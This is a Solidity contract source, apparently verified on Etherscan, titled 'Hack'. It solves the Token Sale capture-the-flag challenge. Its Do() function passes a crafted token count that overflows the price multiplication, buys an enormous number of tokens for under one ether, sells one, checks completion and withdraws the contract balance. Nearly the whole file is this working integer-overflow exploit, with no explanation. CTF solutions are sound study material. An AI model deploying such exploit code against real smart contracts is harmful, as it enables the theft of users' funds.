/**
 *Submitted for verification at Etherscan.io on 2022-04-05
*/

pragma solidity ^0.4.21;


interface TokenSaleChallenge {
    function isComplete() external view returns (bool);
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
}

contract Hack {
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function getmax() public pure returns (uint256) {
        uint256 n = 0;
        n = n - 1;
        return n;
    }

    function getv() public pure returns (uint256) {
        uint256 n = getmax();
        n = n - 1;
        return n * PRICE_PER_TOKEN;
    }

    function getether(uint256 numTokens) public pure returns (uint256) {
        return numTokens * PRICE_PER_TOKEN;
    }
    
    function Do(address addr) public payable {
        TokenSaleChallenge(addr).buy.value(415992086870360064)(115792089237316195423570985008687907853269984665640564039458);
        TokenSaleChallenge(addr).sell(1);
        require(TokenSaleChallenge(addr).isComplete());
        msg.sender.transfer(address(this).balance);
    }

    function() public payable{
    }
}